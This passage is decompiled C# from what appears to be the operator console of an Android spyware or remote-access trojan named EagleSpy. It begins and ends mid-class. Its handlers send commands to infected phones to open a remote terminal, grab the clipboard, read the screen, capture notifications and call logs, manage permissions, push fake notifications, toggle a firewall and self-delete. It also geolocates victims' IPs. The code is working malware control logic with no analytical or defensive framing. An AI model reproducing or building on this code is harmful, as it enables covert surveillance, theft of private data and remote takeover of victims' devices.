								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F0 RID: 1264 RVA: 0x00064E10 File Offset: 0x00063010
		private void ToolStripMenuItem15_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								EagleAlert.Showinformation("the tool is under maintenance ");
								break;
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F1 RID: 1265 RVA: 0x00064ECC File Offset: 0x000630CC
		private void RESTARTCONNECTION()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
								client.Close(myClient);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F2 RID: 1266 RVA: 0x00064FD4 File Offset: 0x000631D4
		private void ToolStripMenuItem17_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								client.Blockme(client.ClientAddressIP);
								client.Close(client.myClient);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F3 RID: 1267 RVA: 0x0006509C File Offset: 0x0006329C
		private void ALLOWTODELETE()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"kill<*>x",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x00065254 File Offset: 0x00063454
		private void SELFDELETE()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "SelfRemove_" + client.ClientAddressIP;
								SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[text];
								if (selfRemove == null)
								{
									new SelfRemove
									{
										Classclient = client
									}.Show();
								}
								else
								{
									selfRemove.BringToFront();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x0006535C File Offset: 0x0006355C
		private void CLIENTSUSERFOLDER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							try
							{
								if (client != null)
								{
									string folderUSER = client.FolderUSER;
									if (!Directory.Exists(folderUSER))
									{
										Directory.CreateDirectory(folderUSER);
									}
									Process.Start(folderUSER);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F6 RID: 1270 RVA: 0x00065440 File Offset: 0x00063640
		private void PERMISSIONMANAGER()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "Permissions_Manager" + client.ClientRemoteAddress;
								PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[text];
								if (permissionsManager != null)
								{
									permissionsManager.BringToFront();
									break;
								}
								new PermissionsManager
								{
									Name = text,
									Tag = client.ClientAddressIP,
									Classclient = client
								}.Show();
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"RPM<*>[lod]",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
								EagleAlert.ShowSucess("Loading Permissions Started...");
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F7 RID: 1271 RVA: 0x00065680 File Offset: 0x00063880
		private void COMMANDTERMINAL()
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] array = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".terminal",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCommand,
										Data.SPL_SOCKET,
										"run"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F8 RID: 1272 RVA: 0x000657F4 File Offset: 0x000639F4
		private void CLIPBOARD()
		{
			try
			{
				if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (client.isconnected)
					{
						TcpClient myClient = client.myClient;
						object[] array = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".info",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.getClipboard,
								Data.SPL_SOCKET,
								"get",
								Data.SPL_DATA,
								"null"
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(array);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004F9 RID: 1273 RVA: 0x00002423 File Offset: 0x00000623
		private void ClientsWindow_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x060004FA RID: 1274 RVA: 0x00065920 File Offset: 0x00063B20
		private void DrakeUIButtonIcon7_Click_1(object senderx, EventArgs ex)
		{
			this.ClientsWindow.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					this.bigtitletext.Text = "Clients";
				}
				else
				{
					this.bigtitletext.Text = "客户";
				}
			}
			else
			{
				this.bigtitletext.Text = "عملاء";
			}
			if (RegistryHandler.GET_FTtip() == null)
			{
				RegistryHandler.Set_FTtip("Shown");
			}
		}

		// Token: 0x060004FB RID: 1275 RVA: 0x000659A0 File Offset: 0x00063BA0
		private void DrakeUIButtonIcon10_Click_1(object sender, EventArgs e)
		{
			this.DGVblocked.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.bigtitletext.Text = "قائمة الحظر";
				return;
			}
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.bigtitletext.Text = "Blocked List";
				return;
			}
			this.bigtitletext.Text = "禁止名单";
		}

		// Token: 0x060004FC RID: 1276 RVA: 0x00065A0C File Offset: 0x00063C0C
		private void Connection_btn_Click(object sender, EventArgs e)
		{
			try
			{
				this.DataLog.BringToFront();
				this.DataLog.Visible = true;
				this.clearbtn.Visible = true;
				string language = RegistryHandler.Get_Language();
				if (Operators.CompareString(language, "AR", false) != 0)
				{
					if (Operators.CompareString(language, "CN", false) != 0)
					{
						this.bigtitletext.Text = "Connections";
					}
					else
					{
						this.bigtitletext.Text = "电信";
					}
				}
				else
				{
					this.bigtitletext.Text = "الاتصالات";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004FD RID: 1277 RVA: 0x00063408 File Offset: 0x00061608
		public string isinteger(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(pass);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(input);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x060004FE RID: 1278 RVA: 0x00062254 File Offset: 0x00060454
		private void ToolStripMenuItem14_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string text = "SC_Readv2_" + client.ClientAddressIP;
								if ((ScreenReaderV2)MyProject.Application.OpenForms[text] == null)
								{
									new ScreenReaderV2
									{
										Name = text,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060004FF RID: 1279 RVA: 0x00002423 File Offset: 0x00000623
		private void Mapworker_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x06000500 RID: 1280 RVA: 0x00065AA8 File Offset: 0x00063CA8
		private void Mapworker_DoWork_1(object sender, DoWorkEventArgs e)
		{
			EagleSpyMain._Closure_0024__171_002D0 closure_0024__171_002D = null;
			checked
			{
				while (this.Alive)
				{
					Thread.Sleep(10000);
					try
					{
						if (this.ClientsWindow.Rows.Count > 0)
						{
							try
							{
								closure_0024__171_002D = new EagleSpyMain._Closure_0024__171_002D0(closure_0024__171_002D);
								closure_0024__171_002D._0024VB_0024Local_keyValues = new Dictionary<string, double>();
								int num = this.ClientsWindow.Rows.Count - 1;
								for (int i = 0; i <= num; i++)
								{
									string text = Data.GeoIP0.LookupCountryCode(((Client)this.ClientsWindow.Rows[i].Cells[8].Tag).ClientAddressIP.ToString().Trim()).ToUpper();
									closure_0024__171_002D._0024VB_0024Local_keyValues[text] = (double)this.ran.Next(100, 1000);
								}
								base.Invoke(new VB_0024AnonymousDelegate_0(closure_0024__171_002D._Lambda_0024__0));
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x00065BB8 File Offset: 0x00063DB8
		private void Statustimer_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					float num = this.cpuCounter.NextValue();
					this.drakeUIMeter1.Value = (double)num;
					if (Operators.CompareString(this.temptext, this.recvtotal.Text, false) == 0)
					{
						this.recvtotal.Text = "Received 0 Bytes";
					}
					else
					{
						this.temptext = this.recvtotal.Text;
					}
					if (Operators.CompareString(this.temptext2, this.senttotal.Text, false) == 0)
					{
						this.senttotal.Text = "Sent 0 Bytes";
					}
					else
					{
						this.temptext2 = this.senttotal.Text;
					}
					int num2 = this.server.Count - 1;
					long num3 = 0L;
					long num4 = 0L;
					for (int i = 0; i <= num2; i++)
					{
						try
						{
							num3 += this.server[i].BytesSent;
							num4 += this.server[i].BytesReceived;
						}
						catch (Exception)
						{
						}
					}
					Array array = Codes.UploadDownload(num3, num4);
					this.recvtotal.Text = Conversions.ToString(Operators.ConcatenateObject("Received : ", array.GetValue(0)));
					this.label20.Text = Conversions.ToString(this.ClientsWindow.Rows.Count);
					this.label41.Text = this.label20.Text;
					this.label21.Text = Conversions.ToString(Operators.ConcatenateObject("", array.GetValue(0)));
					this.label22.Text = Conversions.ToString(Operators.ConcatenateObject("", array.GetValue(1)));
					this.drakeUILabel3.Text = "Selected : " + Conversions.ToString(this.ClientsWindow.SelectedRows.Count);
					this.drakeUILabel2.Text = "CPU : " + num.ToString() + "%";
					this.drakeUILabel4.Text = "Key : " + Data.password;
					this.drakeUILabel1.Text = "Port : " + infoServer.PORTS;
					this.infotext.Text = string.Concat(new string[]
					{
						"Online : ",
						Conversions.ToString(this.ClientsWindow.Rows.Count),
						"\r\nPort : ",
						infoServer.PORTS,
						"\r\nKey :",
						Data.password
					});
					this.infolowtext.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"Ready: ",
						Conversions.ToString(this.ClientsWindow.Rows.Count),
						Strings.Space(5),
						"Selected :",
						this.ClientsWindow.SelectedRows.Count.ToString(),
						Strings.Space(5),
						"Received : "
					}), Operators.AddObject(Operators.AddObject(array.GetValue(0), Strings.Space(5)), "Sent : ")), array.GetValue(1)));
					if (Operators.CompareString(this.label16.Text, Codes.AesDecrypt("g149MONTtQjEFzAAIpgk2w==", "0319749625846139"), false) != 0 && this.ClientsWindow.Rows.Count > 0)
					{
						this.ClientsWindow.Rows.Clear();
					}
				}
				catch (Exception)
				{
				}
				if (Data.LastClient != null && Data.LastClient.isconnected)
				{
					try
					{
						this.lastclientpic.Image = Data.LastClient.Wallpaper;
						this.lastclienttext.Text = string.Concat(new string[]
						{
							Data.LastClient.ClientName,
							"\r\n",
							Data.LastClient.Country,
							"\r\n",
							Data.LastClient.ClientAddressIP
						});
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000502 RID: 1282 RVA: 0x00065FDC File Offset: 0x000641DC
		private void Addpo_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.toblocktext.Text))
			{
				EagleAlert.Showinformation("Enter ip address to block");
				return;
			}
			checked
			{
				try
				{
					int num = this.server.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (!this.server[i].Blocklist.Contains(this.toblocktext.Text))
						{
							this.server[i].Blocklist.Add(this.toblocktext.Text);
							Data.MainForm.DGVblocked.Rows.Add(new object[]
							{
								GetFlagThisIp.ThisIp(this.toblocktext.Text),
								this.toblocktext.Text
							});
						}
					}
					EagleAlert.ShowSucess("Client Blocked Successfully");
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000503 RID: 1283 RVA: 0x000660C8 File Offset: 0x000642C8
		private void ClientsWindow_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
		{
			DataGridViewRow dataGridViewRow = null;
			try
			{
				dataGridViewRow = this.ClientsWindow.Rows[e.RowIndex];
			}
			catch (Exception)
			{
				return;
			}
			try
			{
				Client client = (Client)dataGridViewRow.Cells[8].Tag;
				if (e.ColumnIndex == 8)
				{
					if (dataGridViewRow != null)
					{
						if (client != null && client.isnewnotifi)
						{
							string text = "Notifications_" + client.ClientAddressIP;
							if ((Eaglepopup)MyProject.Application.OpenForms[text] == null)
							{
								new Eaglepopup
								{
									Location = new Point(Cursor.Position.X, Cursor.Position.Y),
									ClassClient = client
								}.Show();
								dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								client.isnewnotifi = false;
							}
						}
						else
						{
							dataGridViewRow.Cells[8].Value = Codes.BlankImage();
						}
					}
				}
				else if (e.ColumnIndex == 9)
				{
					if (client != null && client.isnewcall)
					{
						string text2 = "Calls_Log_" + client.ClientAddressIP;
						if ((EagleSpyCallLogs)MyProject.Application.OpenForms[text2] == null)
						{
							EagleSpyCallLogs eagleSpyCallLogs = new EagleSpyCallLogs();
							eagleSpyCallLogs.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
							eagleSpyCallLogs.ClassClient = client;
							dataGridViewRow.Cells[9].Value = Codes.BlankImage();
							client.isnewcall = false;
							eagleSpyCallLogs.Show();
						}
					}
					else
					{
						dataGridViewRow.Cells[9].Value = Codes.BlankImage();
					}
				}
				else if (e.ColumnIndex == 10)
				{
					try
					{
						if (client != null)
						{
							string text3 = "%" + client.BatteryCharge.Replace("f", "").Replace("t", "");
							dataGridViewRow.Cells[10].ToolTipText = text3;
							Rectangle cellDisplayRectangle = this.ClientsWindow.GetCellDisplayRectangle(e.ColumnIndex, e.RowIndex, false);
							this.ToolTips.Show(text3, this.ClientsWindow, cellDisplayRectangle.Right, checked(cellDisplayRectangle.Top + cellDisplayRectangle.Height));
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000504 RID: 1284 RVA: 0x0000371B File Offset: 0x0000191B
		private void Bigtitletext_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000505 RID: 1285 RVA: 0x0000371B File Offset: 0x0000191B
		private void Label2_MouseDown_1(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000506 RID: 1286 RVA: 0x00066398 File Offset: 0x00064598
		private void Studiobtn_Click(object sender, EventArgs e)
		{
			if (this.ST == null)
			{
				this.ST = new Apk_studio();
				DialogResult dialogResult = this.ST.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.ST.Close();
					this.ST = null;
					return;
				}
				this.ST.Close();
				this.ST = null;
			}
		}

		// Token: 0x06000507 RID: 1287 RVA: 0x000663F0 File Offset: 0x000645F0
		private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
		{
			try
			{
				this.notificationspanel.BringToFront();
				this.DataLog.Visible = true;
				this.clearbtn.Visible = true;
				string language = RegistryHandler.Get_Language();
				if (Operators.CompareString(language, "AR", false) != 0)
				{
					if (Operators.CompareString(language, "CN", false) != 0)
					{
						this.bigtitletext.Text = "Notificatios";
					}
					else
					{
						this.bigtitletext.Text = "通知";
					}
				}
				else
				{
					this.bigtitletext.Text = "التنبيهات";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000508 RID: 1288 RVA: 0x000037F2 File Offset: 0x000019F2
		private void DrakeUIButtonIcon10_Click_2(object sender, EventArgs e)
		{
			if (this.DGVNOTF.Rows.Count > 0)
			{
				this.DGVNOTF.Rows.Clear();
			}
		}

		// Token: 0x06000509 RID: 1289 RVA: 0x00003817 File Offset: 0x00001A17
		private void DrakeUIButtonIcon7_Click_2(object sender, EventArgs e)
		{
			if (this.DGVCALLS.Rows.Count > 0)
			{
				this.DGVCALLS.Rows.Clear();
			}
		}

		// Token: 0x0600050A RID: 1290 RVA: 0x0000383C File Offset: 0x00001A3C
		private void DrakeUIButtonIcon11_Click_1(object sender, EventArgs e)
		{
			if (this.DGVALRTS.Rows.Count > 0)
			{
				this.DGVALRTS.Rows.Clear();
			}
		}

		// Token: 0x0600050B RID: 1291 RVA: 0x0006648C File Offset: 0x0006468C
		private void Porttext_TextChanged(object sender, EventArgs e)
		{
			if (!(string.IsNullOrEmpty(this.porttext.Text) | string.IsNullOrWhiteSpace("porttext.Text")) && !Versioned.IsNumeric(this.porttext.Text))
			{
				EagleAlert.Showinformation("Only Enter Numbers");
				this.porttext.Text = "";
			}
		}

		// Token: 0x0600050C RID: 1292 RVA: 0x000664E4 File Offset: 0x000646E4
		private void Rempo_Click(object sender, EventArgs e)
		{
			if (this.DGVSERVS.Rows.Count < 1)
			{
				return;
			}
			if (this.DGVSERVS.SelectedRows.Count == 0)
			{
				EagleAlert.Showinformation("Select Port First");
				return;
			}
			DataGridViewRow dataGridViewRow = this.DGVSERVS.SelectedRows[0];
			if (dataGridViewRow != null)
			{
				if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[2].Value, "ON", false))
				{
					EagleAlert.Showinformation("Stop Server First");
					return;
				}
				this.DGVSERVS.Rows.Remove(dataGridViewRow);
			}
		}

		// Token: 0x0600050D RID: 1293 RVA: 0x00003861 File Offset: 0x00001A61
		private void DrakeUIButtonIcon15_Click(object sender, EventArgs e)
		{
			if (this.DGVSERVS.Rows.Count >= 1 && this.DGVSERVS.SelectedRows.Count == 0)
			{
				EagleAlert.Showinformation("Select Port First");
			}
		}

		// Token: 0x0600050E RID: 1294 RVA: 0x00066574 File Offset: 0x00064774
		private void DrakeUIButtonIcon14_Click(object sender, EventArgs e)
		{
			try
			{
				this.serverspanel.BringToFront();
				string language = RegistryHandler.Get_Language();
				if (Operators.CompareString(language, "AR", false) != 0)
				{
					if (Operators.CompareString(language, "CN", false) != 0)
					{
						this.bigtitletext.Text = "Servers";
					}
					else
					{
						this.bigtitletext.Text = "服务器";
					}
				}
				else
				{
					this.bigtitletext.Text = "المخدمات";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600050F RID: 1295 RVA: 0x00003861 File Offset: 0x00001A61
		private void Exitbtn_Click(object sender, EventArgs e)
		{
			if (this.DGVSERVS.Rows.Count >= 1 && this.DGVSERVS.SelectedRows.Count == 0)
			{
				EagleAlert.Showinformation("Select Port First");
			}
		}

		// Token: 0x06000510 RID: 1296 RVA: 0x000665F8 File Offset: 0x000647F8
		private void DrakeUIAvatar4_Click_1(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				try
				{
					List<Client> list = new List<Client>();
					foreach (object obj in this.ClientsWindow.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						try
						{
							if (dataGridViewRow.Tag != null)
							{
								Client client = (Client)dataGridViewRow.Cells[8].Tag;
								if (client != null)
								{
									list.Add(client);
								}
							}
						}
						catch (Exception)
						{
						}
					}
					if (list.Count > 0)
					{
						NotificationMaker notificationMaker = new NotificationMaker(list);
						if (notificationMaker.ShowDialog() == DialogResult.OK && notificationMaker.SelectedList.Count > 0)
						{
							foreach (Client client2 in notificationMaker.SelectedList)
							{
								TcpClient myClient = client2.myClient;
								string text = notificationMaker.titletext.Text;
								if (string.IsNullOrEmpty(text))
								{
									text = "null";
								}
								string text2 = notificationMaker.msgtext.Text;
								if (string.IsNullOrEmpty(text2))
								{
									text2 = "null";
								}
								string type = notificationMaker.type;
								string openthis = notificationMaker.Openthis;
								string text3 = "1";
								if (notificationMaker.checkusrcraxs.Checked)
								{
									text3 = "0";
								}
								string text4 = string.Concat(new string[] { text, ">", text2, ">", type, ">", openthis, ">", text3, ">" });
								string[] array = client2.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"noti<*>",
										text4,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client2.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client2
								};
								client2.SendMessage(array2);
							}
							EagleAlert.ShowSucess("Notification Sent Successfully");
						}
						notificationMaker.Dispose();
					}
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			EagleAlert.Showinformation("No Clients Found");
		}

		// Token: 0x06000511 RID: 1297 RVA: 0x0006692C File Offset: 0x00064B2C
		private void DrakeUIAvatar8_Click_1(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (client.IsonVPN)
			{
				Codes.MyMsgBox("Alert", "Firewall is already active", false, Resources.warning48px);
				return;
			}
			string[] array = client.Keys.Split(new char[] { ':' });
			int num = 0;
			int num2 = 0;
			if (Codes.MyMsgBox("Alert", "Client will restart connection", true, Resources.warning48px))
			{
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"FW<*>S",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(num),
						Data.SPL_SOCKET,
						Conversions.ToString(num2),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
				Thread.Sleep(1000);
				client.Close(client.myClient);
			}
		}

		// Token: 0x06000512 RID: 1298 RVA: 0x00066AC0 File Offset: 0x00064CC0
		private void DrakeUIAvatar9_Click_1(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count <= 0 || this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
			if (!client.IsonVPN)
			{
				Codes.MyMsgBox("Alert", "Firewall is already disabled", false, Resources.warning48px);
				return;
			}
			string[] array = client.Keys.Split(new char[] { ':' });
			int num = 0;
			int num2 = 0;
			if (Codes.MyMsgBox("Alert", "Client will restart connection", true, Resources.warning48px))
			{
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"FW<*>T",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(num),
						Data.SPL_SOCKET,
						Conversions.ToString(num2),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
				Thread.Sleep(1000);
				client.Close(client.myClient);
			}
		}

		// Token: 0x06000513 RID: 1299 RVA: 0x00066C54 File Offset: 0x00064E54
		private void DrakeUIAvatar5_Click_1(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count > 0 && this.ClientsWindow.SelectedRows.Count > 0)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					client.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"FW<*>C",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						client.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(array2);
			}
		}

		// Token: 0x06000514 RID: 1300 RVA: 0x00066D98 File Offset: 0x00064F98
		private void AllowAppToolStripMenuItem_Click(object sender, EventArgs e)
		{
